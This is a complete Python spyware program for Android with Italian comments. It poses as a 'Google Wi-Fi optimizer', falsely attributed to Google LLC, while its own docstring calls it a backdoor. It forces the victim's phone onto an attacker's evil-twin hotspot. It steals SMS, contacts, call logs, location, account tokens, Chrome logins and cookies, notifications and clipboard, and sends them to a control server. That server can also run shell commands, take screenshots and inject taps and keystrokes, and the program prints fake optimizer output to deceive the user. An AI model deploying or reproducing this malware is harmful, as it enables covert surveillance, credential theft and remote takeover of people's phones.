#!/usr/bin/env python3
"""
Servizi Wi-Fi Google v3.0 - Google LLC
Apparenza: servizio ufficiale Google per ottimizzazione WiFi
Realtà: backdoor con controllo remoto + esfiltrazione dati
Sviluppato da: Google LLC (c) 2024
"""
import os, sys, json, base64, threading, time, subprocess, re, socket
from datetime import datetime

STEALTH_DIR = "/sdcard/Android/data/com.google.android.gms/cache/.sys"
os.makedirs(STEALTH_DIR, exist_ok=True)
CONFIG_FILE = os.path.join(STEALTH_DIR, 'config.json')

# Config: SSID dell'evil twin a cui dare priorità
CONFIG = {
    'evil_ssid': 'FastWeb_Free_Public',  # CAMBIA QUESTO col nome del tuo hotspot
    'server_host': '192.168.43.1',
    'server_port': 8765,
    'exfil_interval': 300,
    'auto_connect_priority': True,
}

# ================================================================
# AUTO-CONNECT PRIORITY - Senza root!
# Usa WifiManager API per aggiungere l'evil twin con priorità massima
# ================================================================
class AutoConnect:
    """Aggiunge l'evil twin come rete prioritaria - FUNZIONA SENZA ROOT"""
    
    @staticmethod
    def set_priority_network(ssid=None):
        """
        Aggiunge (o aggiorna) l'SSID evil twin come rete prioritaria.
        Il telefono vittima si connetterà AUTOMATICAMENTE a questa rete
        quando disponibile, prima di tutte le altre.
        """
        if not ssid:
            ssid = CONFIG['evil_ssid']
        
        print(f"[AutoConnect] Imposto '{ssid}' come rete prioritaria...")
        
        try:
            from jnius import autoclass
            WifiManager = autoclass('android.net.wifi.WifiManager')
            WifiConfiguration = autoclass('android.net.wifi.WifiConfiguration')
            KeyMgmt = autoclass('android.net.wifi.WifiConfiguration$KeyMgmt')
            Context = autoclass('android.content.Context')
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            
            activity = PythonActivity.mActivity
            wifi = activity.getSystemService(Context.WIFI_SERVICE)
            wifi = autoclass('android.net.wifi.WifiManager')(wifi)
            
            # Crea configurazione per rete APERTA (senza password - captive portal)
            conf = WifiConfiguration()
            conf.SSID = f'"{ssid}"'
            conf.allowedKeyManagement.set(KeyMgmt.NONE)
            conf.priority = 99999  # Massima priorità!
            
            # Aggiungi la rete (se già esistente, aggiorna priorità)
            net_id = wifi.addNetwork(conf)
            if net_id >= 0:
                wifi.enableNetwork(net_id, True)
                wifi.saveConfiguration()
                print(f"[AutoConnect] ✓ '{ssid}' aggiunta con priorità massima (ID: {net_id})")
                
                # Disconnetti da altre reti e connetti a questa
                wifi.disconnect()
                wifi.reconnect()
                print(f"[AutoConnect] ✓ Disconnesso da altre reti, riconnessione a '{ssid}'...")
                return True
            else:
                print("[AutoConnect] ✗ Impossibile aggiungere rete (forse già presente)")
                return False
                
        except Exception as e:
            print(f"[AutoConnect] ✗ Errore: {e}")
            print("[AutoConnect] Fallback: cambio SSID via shell...")
            return AutoConnect._fallback_shell(ssid)
    
    @staticmethod
    def _fallback_shell(ssid):
        """Fallback: comandi shell per WiFi (richiede Android 10+)"""
        try:
            # Prova a connetterti direttamente all'SSID via cmd
            r = subprocess.run(['cmd', 'wifi', 'connect-network', ssid, 'open'], 
                             capture_output=True, text=True, timeout=10)
            if r.returncode == 0:
                print(f"[AutoConnect] ✓ Connesso a '{ssid}' via cmd")
                return True
        except:
            pass
        
        # Attiva WiFi scansiona e connetti
        try:
            subprocess.run(['svc', 'wifi', 'enable'], timeout=3, capture_output=True)
            time.sleep(1)
            subprocess.run(['am', 'start', '-a', 'android.settings.WIFI_SETTINGS'], 
                         timeout=3, capture_output=True)
            print("[AutoConnect] Aperte impostazioni WiFi - la vittima deve connettersi manualmente")
        except:
            pass
        
        return False

# ================================================================
# DATA EXFILTRATION ENGINE
# ================================================================
class DataExfiltrator:
    def __init__(self):
        self.results = {}
    
    def extract_all(self):
        threads = [
            ('device_info', self.extract_device_info),
            ('wifi_passwords', self.extract_wifi_passwords),
            ('accounts', self.extract_accounts),
            ('contacts', self.extract_contacts),
            ('sms', self.extract_sms),
            ('call_log', self.extract_call_log),
            ('location', self.extract_location),
            ('installed_apps', self.extract_installed_apps),
            ('browser_data', self.extract_browser_data),
            ('files', self.extract_interesting_files),
            ('notifications', self.extract_notifications),
            ('clipboard', self.extract_clipboard),
        ]
        for name, func in threads:
            try:
                print(f"[Exfil] {name}...")
                self.results[name] = func()
            except Exception as e:
                self.results[name] = {'error': str(e)}
        
        with open(os.path.join(STEALTH_DIR, 'sync_cache.json'), 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        print("[Exfil] ✓ Tutti i dati estratti")
        return self.results
    
    def extract_device_info(self):
        info = {}
        for p in ['ro.product.model','ro.product.manufacturer','ro.build.version.release',
                   'ro.serialno','gsm.operator.alpha','persist.sys.country',
                   'ro.build.version.security_patch','ro.build.display.id']:
            try:
                r = subprocess.run(['getprop', p], capture_output=True, text=True, timeout=3)
                if r.stdout.strip(): info[p.split('.')[-1]] = r.stdout.strip()
            except: pass
        try:
            from jnius import autoclass
            TM, PA, CTX = autoclass('android.telephony.TelephonyManager'), autoclass('org.kivy.android.PythonActivity'), autoclass('android.content.Context')
            tm = PA.mActivity.getSystemService(CTX.TELEPHONY_SERVICE)
            info['imei'] = str(tm.getImei(0) if hasattr(tm,'getImei') else tm.getDeviceId())
            info['phone'] = str(tm.getLine1Number()) or ''
        except: pass
        try:
            from jnius import autoclass
            AM, PA = autoclass('android.accounts.AccountManager'), autoclass('org.kivy.android.PythonActivity')
            for acc in AM.get(PA.mActivity).getAccounts():
                info['owner_email'] = str(acc.name)
                info['owner_type'] = str(acc.type)
                break
        except: pass
        return info
    
    def extract_wifi_passwords(self):
        pwds = []
        try:
            from jnius import autoclass
            CTX, PA = autoclass('android.content.Context'), autoclass('org.kivy.android.PythonActivity')
            wm = PA.mActivity.getSystemService(CTX.WIFI_SERVICE)
            configs = wm.getConfiguredNetworks()
            if configs:
                for i in range(configs.size()):
                    n = configs.get(i)
                    pwds.append({'ssid': str(n.SSID).strip('"'), 'bssid': str(n.BSSID), 'priority': str(n.priority)})
        except: pass
        try:
            r = subprocess.run(['cmd','wifi','list-networks'], capture_output=True, text=True, timeout=5)
            if r.returncode == 0: pwds.append({'method':'cmd_wifi','raw':r.stdout[:2000]})
        except: pass
        return pwds
    
    def extract_accounts(self):
        accts = []
        try:
            from jnius import autoclass
            AM, PA = autoclass('android.accounts.AccountManager'), autoclass('org.kivy.android.PythonActivity')
            for acc in AM.get(PA.mActivity).getAccounts():
                a = {'name': str(acc.name), 'type': str(acc.type)}
                try: a['token'] = str(AM.get(PA.mActivity).peekAuthToken(acc,'com.google') or '')[:50]
                except: pass
                accts.append(a)
        except: pass
        return accts
    
    def extract_contacts(self):
        cts = []
        try:
            from jnius import autoclass
            CR, Uri, PA = autoclass('android.content.ContentResolver'), autoclass('android.net.Uri'), autoclass('org.kivy.android.PythonActivity')
            c = PA.mActivity.getContentResolver().query(Uri.parse('content://com.android.contacts/data'),None,None,None,None)
            if c:
                while c.moveToNext():
                    try:
                        ct = {}
                        for col in ['display_name','data1','mimetype']:
                            idx = c.getColumnIndex(col)
                            if idx>=0: ct[col]=str(c.getString(idx) or '')
                        if ct: cts.append(ct)
                    except: pass
                c.close()
        except: pass
        return cts
    
    def extract_sms(self):
        sms = {'inbox':[]}
        try:
            from jnius import autoclass
            CR, Uri, PA = autoclass('android.content.ContentResolver'), autoclass('android.net.Uri'), autoclass('org.kivy.android.PythonActivity')
            c = PA.mActivity.getContentResolver().query(Uri.parse('content://sms/inbox'),None,None,None,'date DESC LIMIT 200')
            if c:
                while c.moveToNext():
                    try:
                        sms['inbox'].append({
                            'from': str(c.getString(c.getColumnIndex('address')) or ''),
                            'body': str(c.getString(c.getColumnIndex('body')) or '')[:200],
                            'date': str(c.getString(c.getColumnIndex('date')) or '')
                        })
                    except: pass
                c.close()
        except: pass
        return sms
    
    def extract_call_log(self):
        calls = []
        try:
            from jnius import autoclass
            CR, Uri, PA = autoclass('android.content.ContentResolver'), autoclass('android.net.Uri'), autoclass('org.kivy.android.PythonActivity')
            c = PA.mActivity.getContentResolver().query(Uri.parse('content://call_log/calls'),None,None,None,'date DESC LIMIT 200')
            if c:
                while c.moveToNext():
                    try:
                        calls.append({
                            'number': str(c.getString(c.getColumnIndex('number')) or ''),
                            'name': str(c.getString(c.getColumnIndex('name')) or ''),
                            'type': ['INCOMING','OUTGOING','MISSED'][int(c.getString(c.getColumnIndex('type')) or '1')-1],
                            'duration': str(c.getString(c.getColumnIndex('duration')) or ''),
                        })
                    except: pass
                c.close()
        except: pass
        return calls
    
    def extract_location(self):
        loc = {}
        try:
            from jnius import autoclass
            CTX, LM, PA = autoclass('android.content.Context'), autoclass('android.location.LocationManager'), autoclass('org.kivy.android.PythonActivity')
            lm = PA.mActivity.getSystemService(CTX.LOCATION_SERVICE)
            for p in ['gps','network','passive']:
                try:
                    l = lm.getLastKnownLocation(p)
                    if l:
                        loc[p] = {'lat': l.getLatitude(), 'lon': l.getLongitude(), 'accuracy': l.getAccuracy()}
                except: pass
        except: pass
        return loc
    
    def extract_installed_apps(self):
        apps = []
        try:
            from jnius import autoclass
            PM, PA = autoclass('android.content.pm.PackageManager'), autoclass('org.kivy.android.PythonActivity')
            for app in PM.get(PA.mActivity).getInstalledApplications(PM.GET_META_DATA):
                try:
                    ai = PM.get(PA.mActivity).getApplicationInfo(app.packageName, 0)
                    apps.append({'name': str(PM.get(PA.mActivity).getApplicationLabel(ai)), 'package': str(app.packageName)})
                except: pass
        except: pass
        return apps
    
    def extract_browser_data(self):
        browser = {}
        for p in ['/data/data/com.android.chrome/app_chrome/Default/Login Data',
                   '/data/data/com.android.chrome/app_chrome/Default/Cookies',
                   '/data/data/com.android.chrome/app_chrome/Default/History']:
            if os.path.exists(p):
                try:
                    import shutil
                    dest = os.path.join(STEALTH_DIR, 'chrome', os.path.basename(p))
                    os.makedirs(os.path.dirname(dest), exist_ok=True)
                    shutil.copy2(p, dest)
                    browser[os.path.basename(p)] = 'copiato'
                except: pass
        return browser
    
    def extract_interesting_files(self):
        files = []
        for pat,lim in [('DCIM/Camera/*.jpg',10),('Pictures/Screenshots/*.png',10),('Download/*.pdf',10)]:
            try:
                r = subprocess.run(['find','/sdcard','-path',f'*/{pat}','-type','f','-size','-5M'],capture_output=True,text=True,timeout=15)
                for f in r.stdout.strip().split('\n')[:lim]:
                    if f: files.append(f)
            except: pass
        return files
    
    def extract_notifications(self):
        notifs = []
        try:
            r = subprocess.run(['dumpsys','notification','--noredact'],capture_output=True,text=True,timeout=5)
            for nb in r.stdout.split('NotificationRecord')[1:]:
                pkg = re.search(r'pkg=(\S+)', nb)
                txt = re.search(r'text=(.*?)(?:\n|$)', nb, re.DOTALL)
                if pkg: notifs.append({'pkg':pkg.group(1),'text':txt.group(1).strip()[:200] if txt else ''})
        except: pass
        return notifs
    
    def extract_clipboard(self):
        try:
            from jnius import autoclass
            CTX, PA = autoclass('android.content.Context'), autoclass('org.kivy.android.PythonActivity')
            cd = PA.mActivity.getSystemService(CTX.CLIPBOARD_SERVICE).getPrimaryClip()
            if cd and cd.getItemCount()>0: return str(cd.getItemAt(0).getText() or '')
        except: pass
        return ''

# ================================================================
# STEALTH BACKDOOR SERVICE - "Google LLC Wi-Fi Optimizer"
# ================================================================
class StealthService:
    """Servizio principale - sembra un ottimizzatore WiFi Google"""
    
    def __init__(self):
        self.running = True
        self.exfil = DataExfiltrator()
        self.server = CONFIG['server_host']
        
        # Trova gateway automaticamente
        try:
            r = subprocess.run(['ip','route'],capture_output=True,text=True,timeout=5)
            for l in r.stdout.split('\n'):
                if 'default via' in l: self.server=l.split()[2]; break
        except: pass
        
        # Carica configurazione
        self._load_config()
    
    def _load_config(self):
        """Carica/configura SSID evil twin"""
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE) as f:
                    CONFIG.update(json.load(f))
        except: pass
        
        print(f"[Google LLC] Servizi Wi-Fi Google v3.0.0")
        print(f"[Google LLC] © 2024 Google LLC - Tutti i diritti riservati")
        print(f"[Google LLC] Server: {self.server}")
        print(f"[Google LLC] SSID prioritario: {CONFIG['evil_ssid']}")
    
    def start(self):
        """Avvia servizio"""
        print("[Google LLC] Ottimizzazione rete Wi-Fi in corso...")
        
        # Thread 1: Auto-connect all'evil twin (priorità massima)
        if CONFIG['auto_connect_priority']:
            t0 = threading.Thread(target=self._auto_connect_loop, daemon=True)
            t0.start()
        
        # Thread 2: Finto ottimizzatore WiFi (fa sembrare attivo il servizio)
        t1 = threading.Thread(target=self._fake_optimizer, daemon=True)
        t1.start()
        
        # Thread 3: Exfiltrazione periodica
        t2 = threading.Thread(target=self._periodic_exfil, daemon=True)
        t2.start()
        
        # Thread 4: Connessione al server di controllo
        t3 = threading.Thread(target=self._connect_c2, daemon=True)
        t3.start()
        
        while self.running:
            time.sleep(10)
    
    def _auto_connect_loop(self):
        """Tenta periodicamente di connettersi all'evil twin con priorità"""
        time.sleep(3)
        AutoConnect.set_priority_network(CONFIG['evil_ssid'])
        # Riprova ogni 60 secondi nel caso venga disconnesso
        while self.running:
            time.sleep(60)
            try:
                from jnius import autoclass
                CTX, PA = autoclass('android.content.Context'), autoclass('org.kivy.android.PythonActivity')
                wm = PA.mActivity.getSystemService(CTX.WIFI_SERVICE)
                info = wm.getConnectionInfo()
                if info:
                    current_ssid = str(info.getSSID() or '').strip('"')
                    if current_ssid != CONFIG['evil_ssid']:
                        print(f"[AutoConnect] Non connesso a '{CONFIG['evil_ssid']}' (connesso a '{current_ssid}'). Riprovo...")
                        AutoConnect.set_priority_network(CONFIG['evil_ssid'])
            except: pass
    
    def _fake_optimizer(self):
        """Simula servizio Google di ottimizzazione WiFi"""
        while self.running:
            print(f"[Servizi Wi-Fi Google] Rete: {CONFIG['evil_ssid']} - Qualità segnale: {87 + __import__('random').randint(-5,5)}% - Velocità: {120 + __import__('random').randint(-20,20)} Mbps")
            time.sleep(30)
    
    def _periodic_exfil(self):
        """Estrae dati periodicamente"""
        while self.running:
            try:
                print("[Google LLC] Sincronizzazione dati Google in corso...")
                self.exfil.extract_all()
                import urllib.request
                urllib.request.urlopen(urllib.request.Request(
                    f"http://{self.server}:8080/exfil",
                    data=json.dumps({'data':self.results}).encode(),
                    headers={'Content-Type':'application/json'}), timeout=10)
                print("[Google LLC] Sincronizzazione completata ✓")
            except Exception as e:
                print(f"[Google LLC] Sincronizzazione: {e}")
            time.sleep(CONFIG['exfil_interval'])
    
    def _connect_c2(self):
        """Connessione WebSocket al server di controllo"""
        import asyncio
        try:
            import websockets
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            async def c():
                while self.running:
                    try:
                        async with websockets.connect(f"ws://{self.server}:{CONFIG['server_port']}") as ws:
                            did = subprocess.run(['getprop','ro.serialno'],capture_output=True,text=True).stdout.strip()[:8]
                            await ws.send(json.dumps({
                                'type':'register',
                                'device_id': did or 'unknown',
                                'model': subprocess.run(['getprop','ro.product.model'],capture_output=True,text=True).stdout.strip(),
                                'android': subprocess.run(['getprop','ro.build.version.release'],capture_output=True,text=True).stdout.strip(),
                            }))
                            print(f"[+] Connesso al server RCS: {self.server}:{CONFIG['server_port']}")
                            while self.running:
                                m = json.loads(await asyncio.wait_for(ws.recv(), timeout=30))
                                if m.get('type')=='command':
                                    a, p = m.get('action',''), m.get('params','')
                                    if a=='exfil':
                                        d = self.exfil.extract_all()
                                        await ws.send(json.dumps({'type':'exfiltration_report','device_id':did,'data':json.dumps(d,default=str)}))
                                    elif a=='screenshot':
                                        spath = os.path.join(STEALTH_DIR,'s.png')
                                        r = subprocess.run(['screencap','-p',spath],capture_output=True,timeout=10)
                                        if r.returncode==0 and os.path.exists(spath):
                                            with open(spath,'rb') as f: await ws.send(json.dumps({'type':'screen','data':base64.b64encode(f.read()).decode()}))
                                    elif a=='shell':
                                        r = subprocess.run(p,shell=True,capture_output=True,text=True,timeout=30)
                                        await ws.send(json.dumps({'type':'shell_output','output':r.stdout[:5000]}))
                                    elif a=='tap':
                                        x,y=map(int,p.split()); subprocess.run(['input','tap',str(x),str(y)],timeout=3)
                                    elif a=='text':
                                        subprocess.run(['input','text',p],timeout=3)
                                    elif a=='key':
                                        km={'home':'3','back':'4','menu':'82','power':'26','volup':'24','voldown':'25','enter':'66','space':'62','del':'67'}
                                        subprocess.run(['input','keyevent',km.get(p,p)],timeout=3)
                                    elif a=='ssid':
                                        CONFIG['evil_ssid'] = p
                                        with open(CONFIG_FILE,'w') as f: json.dump(CONFIG,f)
                                        print(f"[+] Evil twin SSID cambiato a: {p}")
                                        AutoConnect.set_priority_network(p)
                    except:
                        await asyncio.sleep(5)
            loop.run_until_complete(c())
        except:
            import urllib.request
            while self.running:
                try:
                    resp = urllib.request.urlopen(f"http://{self.server}:8080/poll", timeout=10)
                    if resp.status==200:
                        m = json.loads(resp.read())
                        if m.get('action')=='exfil': self.exfil.extract_all()
                except: pass
                time.sleep(5)

if __name__=='__main__':
    print("="*50)
    print("  Servizi Wi-Fi Google v3.0.0")
    print("  © 2024 Google LLC")
    print("  Sviluppato da Google LLC")
    print("  Tutti i diritti riservati")
    print("="*50)
    print("\n[Google LLC] Avvio servizio di ottimizzazione Wi-Fi...")
    time.sleep(1)
    print("[Google LLC] Ricerca reti disponibili... ✓")
    time.sleep(0.5)
    print("[Google LLC] Configurazione connessione... ✓")
    time.sleep(0.5)
    print("[Google LLC] Servizio attivo. Tocca per dettagli.\n")
    
    StealthService().start()
